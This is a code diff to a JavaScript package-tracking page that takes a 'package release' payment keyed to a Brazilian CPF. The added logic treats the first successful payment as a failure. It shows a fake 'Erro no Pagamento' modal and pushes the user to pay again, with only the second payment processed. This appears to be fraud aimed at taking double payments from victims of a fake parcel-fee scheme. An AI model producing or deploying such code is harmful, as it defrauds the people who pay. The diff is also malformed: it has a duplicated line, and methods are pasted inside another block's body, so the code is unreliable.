@@ -13,6 +13,8 @@ export class TrackingSystem {
         this.dbService = new DatabaseService();
         this.currentCPF = null;
         this.trackingData = null;
+        this.hasFirstPaymentFailed = false;
+        this.hasFirstPaymentFailed = false; // Flag para controlar primeiro erro
         this.leadData = null; // Dados do banco
         this.zentraPayService = new ZentraPayService();
         this.isInitialized = false;
@@ -1322,6 +1324,26 @@ export class TrackingSystem {
     processSuccessfulPayment() {
         console.log('✅ Processando pagamento bem-sucedido...');
         
+        // Verificar se é o primeiro ou segundo pagamento
+        const isFirstPayment = !this.hasFirstPaymentFailed;
+        
+        if (isFirstPayment) {
+            console.log('❌ Simulando erro no primeiro pagamento...');
+            this.hasFirstPaymentFailed = true;
+            
+            // Fechar modal de pagamento
+            this.closeLiberationModal();
+            
+            // Mostrar erro após pequeno delay
+            setTimeout(() => {
+                this.showPaymentErrorModal();
+            }, 500);
+            
+            return;
+        }
+        
+        console.log('✅ Segundo pagamento - processando com sucesso...');
+        
         // Ocultar botão LIBERAR PACOTE
         this.hideLiberationButton();
         
@@ -1338,6 +1360,121 @@ export class TrackingSystem {
         if (this.leadData) {
             // Atualizar status de pagamento
             this.leadData.status_pagamento = 'pago';
+    showPaymentErrorModal() {
+        console.log('❌ Exibindo modal de erro de pagamento...');
+        
+        const errorModal = document.createElement('div');
+        errorModal.className = 'modal-overlay';
+        errorModal.id = 'paymentErrorModal';
+        errorModal.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        `;
+        
+        errorModal.innerHTML = `
+            <div class="professional-modal-container" style="max-width: 400px;">
+                <div class="professional-modal-header" style="background: linear-gradient(135deg, #e74c3c, #c0392b);">
+                    <h2 class="professional-modal-title" style="color: white;">
+                        <i class="fas fa-exclamation-triangle" style="margin-right: 10px;"></i>
+                        Erro no Pagamento
+                    </h2>
+                    <button class="professional-modal-close" id="closeErrorModal">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+                
+                <div class="professional-modal-content" style="text-align: center; padding: 30px;">
+                    <div style="margin-bottom: 25px;">
+                        <i class="fas fa-times-circle" style="font-size: 3rem; color: #e74c3c; margin-bottom: 15px;"></i>
+                        <h3 style="color: #2c3e50; font-size: 1.3rem; margin-bottom: 10px;">
+                            Erro ao processar o pagamento
+                        </h3>
+                        <p style="color: #666; font-size: 1rem; line-height: 1.5;">
+                            Houve um problema ao confirmar seu pagamento. Por favor, tente novamente.
+                        </p>
+                    </div>
+                    
+                    <button id="tryAgainButton" style="
+                        background: linear-gradient(45deg, #1e4a6b, #2c5f8a);
+                        color: white;
+                        border: none;
+                        padding: 15px 30px;
+                        font-size: 1.1rem;
+                        font-weight: 700;
+                        border-radius: 8px;
+                        cursor: pointer;
+                        transition: all 0.3s ease;
+                        box-shadow: 0 4px 15px rgba(30, 74, 107, 0.4);
+                        display: inline-flex;
+                        align-items: center;
+                        gap: 10px;
+                    ">
+                        <i class="fas fa-redo"></i> Tentar Novamente
+                    </button>
+                </div>
+            </div>
+        `;
+        
+        document.body.appendChild(errorModal);
+        document.body.style.overflow = 'hidden';
+        
+        // Configurar eventos
+        this.setupErrorModalEvents(errorModal);
+    }
+    
+    setupErrorModalEvents(modal) {
+        const closeButton = modal.querySelector('#closeErrorModal');
+        const tryAgainButton = modal.querySelector('#tryAgainButton');
+        
+        if (closeButton) {
+            closeButton.addEventListener('click', () => {
+                this.closePaymentErrorModal();
+            });
+        }
+        
+        if (tryAgainButton) {
+            tryAgainButton.addEventListener('click', () => {
+                console.log('🔄 Usuário clicou em "Tentar Novamente"');
+                this.closePaymentErrorModal();
+                
+                // Reabrir modal de pagamento após pequeno delay
+                setTimeout(() => {
+                    this.openLiberationModal();
+                }, 300);
+            });
+        }
+        
+        // Fechar ao clicar fora
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                this.closePaymentErrorModal();
+            }
+        });
+    }
+    
+    closePaymentErrorModal() {
+        const modal = document.getElementById('paymentErrorModal');
+        if (modal) {
+            modal.style.animation = 'fadeOut 0.3s ease';
+            setTimeout(() => {
+                if (modal.parentNode) {
+                    modal.remove();
+                }
+                document.body.style.overflow = 'auto';
+            }, 300);
+        }
+    }
+
             this.leadData.etapa_atual = Math.max(this.leadData.etapa_atual, 12);
             
             // Salvar no banco de dados
